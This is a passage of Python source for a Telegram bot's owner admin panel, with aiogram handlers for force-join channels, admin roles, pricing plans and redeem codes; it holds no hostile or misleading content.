async def fj_menu(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        try:
            await cq.answer("🚫")
        except Exception:
            pass
        return
    try:
        await cq.answer()
    except Exception:
        pass
    fj = d.get("force_join", {})
    chs = fj.get("channels", [])
    bypass = fj.get("bypass", [])
    st = "🟢 ON" if fj.get("enabled") else "🔴 OFF"
    strict = "🔒 STRICT" if d.get("settings", {}).get("strict_force_join", True) else "🔓 LOOSE"
    txt = (
        f"{em(EMOJI_BELL, '🔗')} <b>Force Join</b>\n\n"
        f"Status: <b>{st}</b> | Mode: <b>{strict}</b>\n"
        f"Channels/Groups: <b>{len(chs)}</b>\n"
        f"Bypass: <b>{len(bypass)}</b>\n\n"
    )
    for c in chs[:8]:
        txt += f"• {esc(c.get('title', 'Channel'))} (<code>{esc(str(c['id'])[:30])}</code>)\n"
    if len(chs) > 8:
        txt += f"<i>+{len(chs) - 8} more</i>\n"
    if not chs:
        txt += "<i>No channels added yet.</i>\n"
    await safe_edit(cq, txt, fj_menu_kb(d))

@R.callback_query(F.data == "owner:fj:toggle")
async def fj_toggle(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        try:
            await cq.answer("🚫")
        except Exception:
            pass
        return
    fj = d.setdefault("force_join", {})
    fj["enabled"] = not fj.get("enabled", False)
    log_audit(d, "fj_toggle", cq.from_user.id, f"enabled={fj['enabled']}")
    save()
    try:
        await cq.answer(f"Force Join {'ON' if fj['enabled'] else 'OFF'}!", show_alert=True)
    except Exception:
        pass
    await fj_menu(cq, state)

# ============================================================
#  FORCE JOIN — add channel/group
# ============================================================
@R.callback_query(F.data == "owner:fj:add")
async def fj_add_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        try:
            await cq.answer("🚫")
        except Exception:
            pass
        return
    try:
        await cq.answer()
    except Exception:
        pass
    await state.set_state(S.fj_add_channel)
    await safe_edit(
        cq,
        f"{em(EMOJI_BELL, '🔗')} <b>Add Channel/Group</b>\n\n"
        f"<b>Step 1/2:</b> Send ID or link\n\n"
        f"Accepted formats:\n"
        f"• <code>@channelusername</code> (public)\n"
        f"• <code>-1001234567890</code> (numeric)\n"
        f"• <code>https://t.me/channelname</code>\n"
        f"• <code>https://t.me/+invite_code</code>\n\n"
        f"⚠️ <b>Bot must be admin in the channel!</b>",
        kb([(sc("cancel"), "owner:fj:menu")]),
    )

@R.message(S.fj_add_channel)
async def fj_add_channel_step1(m: Message, state: FSMContext):
    d = load()
    if not is_owner(m.from_user.id, d):
        await state.clear()
        return
    raw = (m.text or "").strip()
    if not raw:
        await m.answer(f"❌ Empty.", parse_mode="HTML")
        return

    cid_to_store = raw
    if "t.me/" in raw:
        mm = re.search(r"t\.me/([A-Za-z0-9_]+)", raw)
        if mm:
            cid_to_store = "@" + mm.group(1)
    elif raw.lstrip("-").isdigit():
        if not raw.startswith("-100"):
            cid_to_store = "-100" + raw.lstrip("-")
        else:
            cid_to_store = raw

    # verify access
    try:
        chat = await m.bot.get_chat(cid_to_store)
        title_probe = chat.title or "Channel"
    except Exception as e:
        await m.answer(
            f"❌ <b>Bot cannot access</b>\n\n"
            f"ID: <code>{esc(cid_to_store)}</code>\n"
            f"Error: <code>{esc(str(e)[:120])}</code>\n\n"
            f"<b>Fix:</b>\n"
            f"1. Bot ko channel me <b>admin</b> banao\n"
            f"2. Verify ID sahi hai\n"
            f"3. Fir try karo",
            parse_mode="HTML",
        )
        return

    # verify bot admin
    try:
        me = await m.bot.get_me()
        bm = await m.bot.get_chat_member(cid_to_store, me.id)
        if bm.status not in ("administrator", "creator"):
            await m.answer(
                f"⚠️ <b>Bot is NOT admin!</b>\n\n"
                f"ID: <code>{esc(cid_to_store)}</code>\n"
                f"Bot status: <b>{bm.status}</b>\n\n"
                f"<b>Bot ko {esc(title_probe)} ka admin banao!</b>",
                parse_mode="HTML",
            )
            return
    except Exception as e:
        await m.answer(
            f"⚠️ Cannot verify bot admin status:\n"
            f"<code>{esc(str(e)[:120])}</code>",
            parse_mode="HTML",
        )
        return

    await state.update_data(fj_channel_id=cid_to_store, fj_channel_title=title_probe)
    await state.set_state(S.fj_add_link)
    await m.answer(
        f"✅ Bot verified in <b>{esc(title_probe)}</b>\n"
        f"🆔 <code>{esc(cid_to_store)}</code>\n\n"
        f"<b>Step 2/2:</b> Send invite link\n\n"
        f"Example: <code>https://t.me/channelname</code>",
        reply_markup=kb([(sc("cancel"), "owner:fj:menu")]),
        parse_mode="HTML",
    )

@R.message(S.fj_add_link)
async def fj_add_link_step2(m: Message, state: FSMContext):
    d = load()
    if not is_owner(m.from_user.id, d):
        await state.clear()
        return
    link = (m.text or "").strip()
    if not link:
        await m.answer(f"❌ Empty.", parse_mode="HTML")
        return
    if not (link.startswith("http://") or link.startswith("https://")):
        link = "https://" + link
    if "t.me/" not in link:
        await m.answer(
            f"❌ Valid t.me link bhejo.\nExample: <code>https://t.me/channelname</code>",
            parse_mode="HTML",
        )
        return

    fsmd = await state.get_data()
    cid = str(fsmd.get("fj_channel_id", "")).strip()
    title = str(fsmd.get("fj_channel_title", "Channel"))
    if not cid:
        await state.clear()
        await m.answer(f"❌ Expired. Try again.", parse_mode="HTML")
        return

    try:
        ch = await m.bot.get_chat(cid)
        title = ch.title or title
    except Exception:
        pass

    chs = d.setdefault("force_join", {}).setdefault("channels", [])
    chs = [c for c in chs if str(c["id"]) != cid]
    chs.append({
        "id": cid,
        "link": link,
        "title": title,
        "required": True,
    })
    d["force_join"]["channels"] = chs
    log_audit(d, "fj_add_channel", m.from_user.id, f"{cid} {title}")
    save()
    await state.clear()
    await m.answer(
        f"✅ <b>Added!</b>\n\n"
        f"📛 {esc(title)}\n"
        f"🆔 <code>{esc(cid)}</code>\n"
        f"🔗 {esc(link)}\n\n"
        f"💡 <i>Run 'test / diagnose' to verify.</i>",
        reply_markup=kb([
            (sc("test"), "owner:fj:test"),
            (sc("back"), "owner:fj:menu"),
        ]),
        parse_mode="HTML",
    )

# ============================================================
#  FORCE JOIN — remove
# ============================================================
@R.callback_query(F.data == "owner:fj:remove")
async def fj_remove_menu(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        try:
            await cq.answer("🚫")
        except Exception:
            pass
        return
    chs = d.get("force_join", {}).get("channels", [])
    if not chs:
        try:
            await cq.answer("❌ None added")
        except Exception:
            pass
        return
    try:
        await cq.answer()
    except Exception:
        pass
    rows = []
    for c in chs:
        rows.append([btn(
            f"{c.get('title', 'Channel')[:25]}",
            f"owner:fj:del:{c['id']}",
            EMOJI_CROSS, "🗑",
        )])
    rows.append([btn("back", "owner:fj:menu", EMOJI_GEAR, "🔙")])
    await safe_edit(
        cq,
        f"{em(EMOJI_CROSS, '🗑')} <b>Remove Channel</b>\n\nTap to remove:",
        InlineKeyboardMarkup(inline_keyboard=rows),
    )

@R.callback_query(F.data.startswith("owner:fj:del:"))
async def fj_del(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        try:
            await cq.answer("🚫")
        except Exception:
            pass
        return
    cid = cq.data.split("owner:fj:del:", 1)[1]
    chs = d.get("force_join", {}).get("channels", [])
    d["force_join"]["channels"] = [c for c in chs if str(c["id"]) != cid]
    log_audit(d, "fj_del_channel", cq.from_user.id, cid)
    save()
    try:
        await cq.answer("🗑 Removed!")
    except Exception:
        pass
    await fj_menu(cq, state)

# ============================================================
#  FORCE JOIN — test / diagnose
# ============================================================
@R.callback_query(F.data == "owner:fj:test")
async def fj_test(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        try:
            await cq.answer("🚫")
        except Exception:
            pass
        return
    try:
        await cq.answer("🧪 Testing...")
    except Exception:
        pass
    uid = cq.from_user.id
    fj = d.get("force_join", {})
    chs = fj.get("channels", [])
    if not chs:
        await safe_edit(
            cq,
            "❌ No channels added.",
            kb([(sc("back"), "owner:fj:menu")]),
        )
        return
    lines = [f"{em(EMOJI_WARNING, '🧪')} <b>Force Join Diagnostic</b>\n"]
    me = await cq.bot.get_me()
    for ch in chs:
        cid = ch.get("id")
        title = ch.get("title", "Channel")
        line = f"\n<b>{esc(title)}</b>\n🆔 <code>{esc(str(cid)[:40])}</code>\n"
        try:
            chat = await cq.bot.get_chat(cid)
            line += f"✅ get_chat OK — type: <b>{chat.type}</b>\n"
            if chat.username:
                line += f"🌐 @{chat.username}\n"
        except Exception as e:
            line += f"❌ get_chat: <code>{esc(str(e)[:100])}</code>\n"
            lines.append(line)
            continue
        try:
            bm = await cq.bot.get_chat_member(cid, me.id)
            emoji_ = "✅" if bm.status in ("administrator", "creator") else "⚠️"
            line += f"{emoji_} Bot: <b>{bm.status}</b>\n"
            if bm.status not in ("administrator", "creator"):
                line += f"   <i>→ Make bot admin!</i>\n"
        except Exception as e:
            line += f"❌ bot check: <code>{esc(str(e)[:100])}</code>\n"
        try:
            om = await cq.bot.get_chat_member(cid, uid)
            line += f"👤 Your: <b>{om.status}</b>\n"
        except Exception as e:
            line += f"❌ your check: <code>{esc(str(e)[:100])}</code>\n"
        try:
            ok = await check_member(cq.bot, uid, cid)
            line += f"🔍 check_member: <b>{'JOINED' if ok else 'NOT JOINED'}</b>\n"
        except Exception as e:
            line += f"❌ check_member EXC: {esc(str(e)[:100])}\n"
        lines.append(line)
    lines.append("\n━━━━━━━━━━━━━━━━━━━━")
    lines.append("<b>Rules:</b>")
    lines.append("• Bot must be <b>admin</b>")
    lines.append("• Public: <code>@username</code>")
    lines.append("• Private: <code>-100...</code> ID")
    txt = "\n".join(lines)
    if len(txt) > 4000:
        txt = txt[:3990] + "\n<i>...</i>"
    await safe_edit(cq, txt, kb([(sc("back"), "owner:fj:menu")]))

# ============================================================
#  FORCE JOIN — bypass list
# ============================================================
@R.callback_query(F.data == "owner:fj:bypass")
async def fj_bypass_menu(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        try:
            await cq.answer("🚫")
        except Exception:
            pass
        return
    try:
        await cq.answer()
    except Exception:
        pass
    bypass = d.get("force_join", {}).get("bypass", [])
    rows = []
    for u in bypass[:20]:
        rows.append([btn(str(u), f"owner:fj:bypass_del:{u}", EMOJI_CROSS, "🗑")])
    rows.append([btn("add bypass", "owner:fj:bypass_add", EMOJI_PLUS, "➕")])
    rows.append([btn("back", "owner:fj:menu", EMOJI_GEAR, "🔙")])
    txt = f"{em(EMOJI_USER, '🔓')} <b>Bypass List</b>\n\nTotal: <b>{len(bypass)}</b>"
    if not bypass:
        txt += "\n\n<i>No users bypass force join.</i>"
    await safe_edit(cq, txt, InlineKeyboardMarkup(inline_keyboard=rows))

@R.callback_query(F.data == "owner:fj:bypass_add")
async def fj_bypass_add(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        try:
            await cq.answer("🚫")
        except Exception:
            pass
        return
    try:
        await cq.answer()
    except Exception:
        pass
    await state.set_state(S.fj_add_bypass)
    await safe_edit(
        cq,
        f"{em(EMOJI_USER, '🔓')} <b>Add Bypass</b>\n\n"
        f"Send user ID to bypass force join:",
        kb([(sc("cancel"), "owner:fj:bypass")]),
    )

@R.message(S.fj_add_bypass)
async def fj_bypass_add_do(m: Message, state: FSMContext):
    d = load()
    if not is_owner(m.from_user.id, d):
        await state.clear()
        return
    try:
        target = int((m.text or "").strip())
    except Exception:
        await m.answer(f"❌ Numeric ID.", parse_mode="HTML")
        return
    await state.clear()
    byp = d.setdefault("force_join", {}).setdefault("bypass", [])
    if target not in byp:
        byp.append(target)
        log_audit(d, "fj_bypass_add", m.from_user.id, target)
        save()
    await m.answer(
        f"✅ Added <code>{target}</code> to bypass.",
        reply_markup=kb([(sc("back"), "owner:fj:bypass")]),
        parse_mode="HTML",
    )

@R.callback_query(F.data.startswith("owner:fj:bypass_del:"))
async def fj_bypass_del(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        try:
            await cq.answer("🚫")
        except Exception:
            pass
        return
    try:
        target = int(cq.data.split(":")[-1])
    except Exception:
        try:
            await cq.answer("❌")
        except Exception:
            pass
        return
    byp = d.setdefault("force_join", {}).setdefault("bypass", [])
    if target in byp:
        byp.remove(target)
        save()
    try:
        await cq.answer("🗑 Removed")
    except Exception:
        pass
    await fj_bypass_menu(cq, state)

# ============================================================
#  FORCE JOIN — stats
# ============================================================
@R.callback_query(F.data == "owner:fj:stats")
async def fj_stats(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        try:
            await cq.answer("🚫")
        except Exception:
            pass
        return
    try:
        await cq.answer("⏳")
    except Exception:
        pass
    fj = d.get("force_join", {})
    chs = fj.get("channels", [])
    users = d.get("users", {})
    if not chs:
        await safe_edit(
            cq,
            "❌ No channels to check.",
            kb([(sc("back"), "owner:fj:menu")]),
        )
        return
    lines = [f"{em(EMOJI_CHART, '📊')} <b>Force Join Stats</b>\n"]
    total = len(users)
    lines.append(f"👥 Total users: <b>{total}</b>\n")
    for ch in chs:
        title = ch.get("title", "?")
        cid = ch.get("id")
        joined = 0
        pending = 0
        checked = 0
        for us in list(users.keys())[:200]:
            try:
                ok = await check_member(cq.bot, int(us), cid)
                checked += 1
                if ok:
                    joined += 1
                else:
                    pending += 1
            except Exception:
                pending += 1
            if checked >= 100:
                break
        lines.append(
            f"\n📢 <b>{esc(title[:30])}</b>\n"
            f"   ✅ {joined} | ⏳ {pending} (checked {checked})"
        )
    lines.append(f"\n<i>Sampled up to 100 users per channel.</i>")
    txt = "\n".join(lines)
    if len(txt) > 4000:
        txt = txt[:3990] + "\n<i>...</i>"
    await safe_edit(cq, txt, kb([(sc("back"), "owner:fj:menu")]))

# ============================================================
#  OWNERS / ADMINS
# ============================================================
@R.callback_query(F.data == "owner:owners:menu")
async def owners_menu(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        try:
            await cq.answer("🚫")
        except Exception:
            pass
        return
    try:
        await cq.answer()
    except Exception:
        pass
    await safe_edit(
        cq,
        f"{em(EMOJI_CROWN, '👑')} <b>Super Admins</b>\n\n"
        f"Total: <b>{len(d.get('owners', []))}/6</b>",
        owners_menu_kb(d),
    )

@R.callback_query(F.data == "owner:owners:add")
async def owners_add_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        try:
            await cq.answer("🚫")
        except Exception:
            pass
        return
    if len(d.get("owners", [])) >= 6:
        try:
            await cq.answer("❌ Max 6!", show_alert=True)
        except Exception:
            pass
        return
    try:
        await cq.answer()
    except Exception:
        pass
    await state.set_state(S.add_owner)
    await safe_edit(
        cq,
        f"{em(EMOJI_CROWN, '👑')} <b>Add Super Admin</b>\n\n"
        f"Send chat ID:",
        kb([(sc("cancel"), "owner:owners:menu")]),
    )

@R.message(S.add_owner)
async def owners_add_done(m: Message, state: FSMContext):
    d = load()
    if not is_owner(m.from_user.id, d):
        await state.clear()
        return
    try:
        nid = int((m.text or "").strip())
    except Exception:
        await m.answer(f"❌ Valid ID.", parse_mode="HTML")
        return
    if is_owner(nid, d):
        await state.clear()
        await m.answer(f"⚠️ Already!", reply_markup=owners_menu_kb(d), parse_mode="HTML")
        return
    if len(d.get("owners", [])) >= 6:
        await state.clear()
        await m.answer(f"❌ Max 6!", reply_markup=owners_menu_kb(d), parse_mode="HTML")
        return
    d["owners"].append(nid)
    log_audit(d, "add_owner", m.from_user.id, nid)
    save()
    await state.clear()
    await m.answer(
        f"✅ <code>{nid}</code>",
        reply_markup=owners_menu_kb(load()),
        parse_mode="HTML",
    )
    try:
        await m.bot.send_message(nid, f"👑 <b>You're now a Super Admin!</b>", parse_mode="HTML")
    except Exception:
        pass

@R.callback_query(F.data.startswith("owner:owners:del:"))
async def owners_del(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    try:
        did = int(cq.data.split("owner:owners:del:", 1)[1])
    except Exception:
        try:
            await cq.answer("❌")
        except Exception:
            pass
        return
    if not is_owner(uid, d):
        try:
            await cq.answer("🚫")
        except Exception:
            pass
        return
    if did == MAIN_OWNER or did in SUPER_ADMINS:
        try:
            await cq.answer("❌ Cannot remove main!", show_alert=True)
        except Exception:
            pass
        return
    if did in d["owners"]:
        d["owners"].remove(did)
        log_audit(d, "del_owner", uid, did)
        save()
        try:
            await cq.answer("🗑 Removed!")
        except Exception:
            pass
    await owners_menu(cq, state)

@R.callback_query(F.data == "owner:admins:menu")
async def admins_menu(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        try:
            await cq.answer("🚫")
        except Exception:
            pass
        return
    try:
        await cq.answer()
    except Exception:
        pass
    await safe_edit(
        cq,
        f"{em(EMOJI_SHIELD, '🛡')} <b>Admins</b>\n\n"
        f"Total: <b>{len(d.get('admins', []))}</b>",
        admins_menu_kb(d),
    )

@R.callback_query(F.data == "owner:admins:add")
async def admins_add_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        try:
            await cq.answer("🚫")
        except Exception:
            pass
        return
    try:
        await cq.answer()
    except Exception:
        pass
    await state.set_state(S.add_admin)
    await safe_edit(
        cq,
        f"{em(EMOJI_SHIELD, '🛡')} <b>Add Admin</b>\n\n"
        f"Send user ID:",
        kb([(sc("cancel"), "owner:admins:menu")]),
    )

@R.message(S.add_admin)
async def admins_add_done(m: Message, state: FSMContext):
    d = load()
    if not is_owner(m.from_user.id, d):
        await state.clear()
        return
    try:
        nid = int((m.text or "").strip())
    except Exception:
        await m.answer(f"❌ Valid ID.", parse_mode="HTML")
        return
    if nid in d.get("admins", []) or is_owner(nid, d):
        await state.clear()
        await m.answer(f"⚠️ Already!", reply_markup=admins_menu_kb(d), parse_mode="HTML")
        return
    d["admins"].append(nid)
    log_audit(d, "add_admin", m.from_user.id, nid)
    save()
    await state.clear()
    await m.answer(
        f"✅ <code>{nid}</code>",
        reply_markup=admins_menu_kb(load()),
        parse_mode="HTML",
    )
    try:
        await m.bot.send_message(nid, f"🛡 <b>You're now an Admin!</b>", parse_mode="HTML")
    except Exception:
        pass

@R.callback_query(F.data.startswith("owner:admins:del:"))
async def admins_del(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        try:
            await cq.answer("🚫")
        except Exception:
            pass
        return
    try:
        did = int(cq.data.split("owner:admins:del:", 1)[1])
    except Exception:
        try:
            await cq.answer("❌")
        except Exception:
            pass
        return
    if did in d.get("admins", []):
        d["admins"].remove(did)
        log_audit(d, "del_admin", cq.from_user.id, did)
        save()
        try:
            await cq.answer("🗑 Removed!")
        except Exception:
            pass
    await admins_menu(cq, state)

# ============================================================
#  PRICING PLANS
# ============================================================
@R.callback_query(F.data == "owner:pricing:menu")
async def pricing_menu(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        try:
            await cq.answer("🚫")
        except Exception:
            pass
        return
    try:
        await cq.answer()
    except Exception:
        pass
    plans = d.get("pricing", {}).get("plans", [])
    txt = f"{em(EMOJI_MONEY, '💳')} <b>Pricing Plans</b>\n\nTotal: <b>{len(plans)}</b>\n\n"
    for i, p in enumerate(plans, 1):
        cur = p.get("currency", "credits")
        amt = p.get("credits", 0) if cur == "credits" else p.get("coins", 0)
        icon = "💰" if cur == "credits" else "🪙"
        txt += (
            f"{i}. <b>{esc(p['name'])}</b>\n"
            f"   {p['price']} INR = {amt} {icon}\n"
            f"   {esc(p['payment_link'])}\n\n"
        )
    rows = [
        [btn("add plan", "owner:pricing:add", EMOJI_PLUS, "➕")],
        [btn("remove plan", "owner:pricing:remove", EMOJI_CROSS, "🗑")],
        [btn("back", "owner:home", EMOJI_GEAR, "🔙")],
    ]
    await safe_edit(cq, txt, InlineKeyboardMarkup(inline_keyboard=rows))

@R.callback_query(F.data == "owner:pricing:add")
async def pricing_add_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        try:
            await cq.answer("🚫")
        except Exception:
            pass
        return
    try:
        await cq.answer()
    except Exception:
        pass
    await state.set_state(S.add_plan_name)
    await safe_edit(
        cq,
        f"{em(EMOJI_MONEY, '💳')} <b>Add Plan</b>\n\nStep 1/5: Name:",
        kb([(sc("cancel"), "owner:pricing:menu")]),
    )

@R.message(S.add_plan_name)
async def pricing_name(m: Message, state: FSMContext):
    if not is_owner(m.from_user.id, load()):
        await state.clear()
        return
    nm = (m.text or "").strip()[:64]
    if not nm:
        await m.answer(f"❌ Empty.", parse_mode="HTML")
        return
    await state.update_data(plan_name=nm)
    await state.set_state(S.add_plan_price)
    await m.answer("Step 2/5: Price (INR):", parse_mode="HTML")

@R.message(S.add_plan_price)
async def pricing_price(m: Message, state: FSMContext):
    if not is_owner(m.from_user.id, load()):
        await state.clear()
        return
    try:
        p = float((m.text or "").strip())
        if p < 0:
            raise ValueError
        await state.update_data(plan_price=p)
    except Exception:
        await m.answer(f"❌ Valid number.", parse_mode="HTML")
        return
    await state.set_state(S.add_plan_currency)
    await m.answer("Step 3/5: Type <code>credits</code> or <code>coins</code>:", parse_mode="HTML")

@R.message(S.add_plan_currency)
async def pricing_currency(m: Message, state: FSMContext):
    if not is_owner(m.from_user.id, load()):
        await state.clear()
        return
    c = (m.text or "").strip().lower()
    if c not in ("credits", "coins"):
        await m.answer(f"❌ Type credits or coins.", parse_mode="HTML")
        return
    await state.update_data(plan_currency=c)
    if c == "credits":
        await state.set_state(S.add_plan_credits)
        await m.answer("Step 4/5: Credits amount:")
    else:
        await state.set_state(S.add_plan_coins)
        await m.answer("Step 4/5: Coins amount:")

@R.message(S.add_plan_credits)
async def pricing_credits(m: Message, state: FSMContext):
    if not is_owner(m.from_user.id, load()):
        await state.clear()
        return
    try:
        c = int((m.text or "").strip())
        if c <= 0:
            raise ValueError
        await state.update_data(plan_credits=c)
    except Exception:
        await m.answer(f"❌ Valid number.", parse_mode="HTML")
        return
    await state.set_state(S.add_plan_link)
    await m.answer("Step 5/5: Payment link:")

@R.message(S.add_plan_coins)
async def pricing_coins(m: Message, state: FSMContext):
    if not is_owner(m.from_user.id, load()):
        await state.clear()
        return
    try:
        c = int((m.text or "").strip())
        if c <= 0:
            raise ValueError
        await state.update_data(plan_coins=c)
    except Exception:
        await m.answer(f"❌ Valid number.", parse_mode="HTML")
        return
    await state.set_state(S.add_plan_link)
    await m.answer("Step 5/5: Payment link:")

@R.message(S.add_plan_link)
async def pricing_link(m: Message, state: FSMContext):
    d = load()
    if not is_owner(m.from_user.id, d):
        await state.clear()
        return
    link = (m.text or "").strip()
    if not link.startswith("http"):
        await m.answer(f"❌ URL must start with http.", parse_mode="HTML")
        return
    fsmd = await state.get_data()
    plan = {
        "id": str(int(time.time() * 1000)),
        "name": fsmd.get("plan_name", "Plan"),
        "price": fsmd.get("plan_price", 0),
        "currency": fsmd.get("plan_currency", "credits"),
        "credits": fsmd.get("plan_credits", 0),
        "coins": fsmd.get("plan_coins", 0),
        "payment_link": link,
    }
    d.setdefault("pricing", {}).setdefault("plans", []).append(plan)
    log_audit(d, "add_plan", m.from_user.id, plan["name"])
    save()
    await state.clear()
    await m.answer(
        f"✅ Added!",
        reply_markup=kb([(sc("back"), "owner:pricing:menu")]),
        parse_mode="HTML",
    )

@R.callback_query(F.data == "owner:pricing:remove")
async def pricing_remove(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        try:
            await cq.answer("🚫")
        except Exception:
            pass
        return
    plans = d.get("pricing", {}).get("plans", [])
    if not plans:
        try:
            await cq.answer("❌ No plans")
        except Exception:
            pass
        return
    try:
        await cq.answer()
    except Exception:
        pass
    rows = []
    for p in plans:
        rows.append([btn(p['name'][:25], f"owner:pricing:del:{p['id']}", EMOJI_CROSS, "🗑")])
    rows.append([btn("back", "owner:pricing:menu", EMOJI_GEAR, "🔙")])
    await safe_edit(
        cq,
        f"{em(EMOJI_CROSS, '🗑')} <b>Remove Plan</b>",
        InlineKeyboardMarkup(inline_keyboard=rows),
    )

@R.callback_query(F.data.startswith("owner:pricing:del:"))
async def pricing_del(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        try:
            await cq.answer("🚫")
        except Exception:
            pass
        return
    pid = cq.data.split("owner:pricing:del:", 1)[1]
    plans = d.get("pricing", {}).get("plans", [])
    d["pricing"]["plans"] = [p for p in plans if p["id"] != pid]
    save()
    try:
        await cq.answer("🗑 Removed!")
    except Exception:
        pass
    await pricing_menu(cq, state)

# ============================================================
#  REDEEM CODES
# ============================================================
@R.callback_query(F.data == "owner:redeem:menu")
async def redeem_menu(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        try:
            await cq.answer("🚫")
        except Exception:
            pass
        return
    try:
        await cq.answer()
    except Exception:
        pass
    codes = d.get("redeem_codes", {})
    txt = f"{em(EMOJI_GIFT, '🎁')} <b>Redeem Codes</b>\n\nTotal: <b>{len(codes)}</b>\n\n"
    for code, cd in list(codes.items())[:10]:
        st = "✅" if cd.get("uses_left", 0) > 0 else "❌"
        cur = cd.get("currency", "credits")
        ic = "💰" if cur == "credits" else "🪙"
        txt += f"<code>{esc(code)}</code> — {cd['credits']}{ic} — {st} ({cd.get('uses_left', 0)})\n"
    rows = [
        [btn("generate", "owner:redeem:gen", EMOJI_PLUS, "➕")],
        [btn("delete", "owner:redeem:del", EMOJI_CROSS, "🗑")],
        [btn("back", "owner:home", EMOJI_GEAR, "🔙")],
    ]
    await safe_edit(cq, txt, InlineKeyboardMarkup(inline_keyboard=rows))

@R.callback_query(F.data == "owner:redeem:gen")
async def redeem_gen_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        try:
            await cq.answer("🚫")
        except Exception:
            pass
        return
    try:
        await cq.answer()
    except Exception:
        pass
    await state.set_state(S.gen_redeem_currency)
    await safe_edit(
        cq,
        f"{em(EMOJI_GIFT, '🎁')} <b>Generate Redeem Code</b>\n\n"
        f"Step 1/3: Type <code>credits</code> or <code>coins</code>:",
        kb([(sc("cancel"), "owner:redeem:menu")]),
    )

@R.message(S.gen_redeem_currency)
async def redeem_currency(m: Message, state: FSMContext):
    if not is_owner(m.from_user.id, load()):
        await state.clear()
        return
    c = (m.text or "").strip().lower()
    if c not in ("credits", "coins"):
        await m.answer(f"❌ credits / coins.", parse_mode="HTML")
        return
    await state.update_data(gen_currency=c)
    await state.set_state(S.gen_redeem_credits)
    await m.answer(f"Step 2/3: Amount ({c}):")

@R.message(S.gen_redeem_credits)
async def redeem_credits(m: Message, state: FSMContext):
    if not is_owner(m.from_user.id, load()):
        await state.clear()
        return
    try:
        c = int((m.text or "").strip())
        if c <= 0:
            raise ValueError
        await state.update_data(gen_credits=c)
    except Exception:
        await m.answer(f"❌ Valid number.", parse_mode="HTML")
        return
    await state.set_state(S.gen_redeem_uses)
    await m.answer("Step 3/3: Uses:")

@R.message(S.gen_redeem_uses)
async def redeem_uses(m: Message, state: FSMContext):
    d = load()
    if not is_owner(m.from_user.id, d):
        await state.clear()
        return
    try:
        u = int((m.text or "").strip())
        if u < 1:
            raise ValueError
    except Exception:
        await m.answer(f"❌ Valid number.", parse_mode="HTML")
        return
    fsmd = await state.get_data()
    credits = fsmd.get("gen_credits", 10)
    currency = fsmd.get("gen_currency", "credits")
    for _ in range(20):
        code = "SJ" + "".join(random.choices(string.ascii_uppercase + string.digits, k=10))
        if code not in d.get("redeem_codes", {}):
            break
    else:
        code = "SJ" + str(now_ts())[-10:]
    d.setdefault("redeem_codes", {})[code] = {
        "credits": credits,
        "currency": currency,
        "uses_left": u,
        "created_by": m.from_user.id,
        "created_at": now_ts(),
        "used_by": [],
    }
    log_audit(d, "gen_redeem", m.from_user.id, f"{code} {credits} {currency} x{u}")
    save()
    await state.clear()
    await m.answer(
        f"{em(EMOJI_GIFT, '🎉')} <b>Code!</b>\n\n"
        f"<code>{esc(code)}</code>\n"
        f"{credits} {currency}\n"
        f"🔢 {u}",
        reply_markup=kb([(sc("back"), "owner:redeem:menu")]),
        parse_mode="HTML",
    )

@R.callback_query(F.data == "owner:redeem:del")
async def redeem_del_menu(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        try:
            await cq.answer("🚫")
        except Exception:
            pass
        return
    codes = d.get("redeem_codes", {})
    if not codes:
        try:
            await cq.answer("❌ None")
        except Exception:
            pass
        return
    try:
        await cq.answer()
    except Exception:
        pass
    rows = []
    for code in list(codes.keys())[:20]:
        rows.append([btn(code, f"owner:redeem:deldo:{code}", EMOJI_CROSS, "🗑")])
    rows.append([btn("back", "owner:redeem:menu", EMOJI_GEAR, "🔙")])
    await safe_edit(
        cq,
        f"{em(EMOJI_CROSS, '🗑')} <b>Delete Code</b>",
        InlineKeyboardMarkup(inline_keyboard=rows),
    )

@R.callback_query(F.data.startswith("owner:redeem:deldo:"))
async def redeem_del_do(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        try:
            await cq.answer("🚫")
        except Exception:
            pass
        return
    code = cq.data.split("owner:redeem:deldo:", 1)[1]
    if code in d.get("redeem_codes", {}):
        del d["redeem_codes"][code]
        save()
    try:
        await cq.answer("🗑")
    except Exception:
        pass
    await redeem_menu(cq, state)

# ============================================================
#  VIDEOS
# ============================================================
@R.callback_query(F.data == "owner:videos:menu")
async def vids_menu(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_admin(cq.from_user.id, d):
        try:
            await cq.answer("🚫")
        except Exception:
            pass
        return
    try:
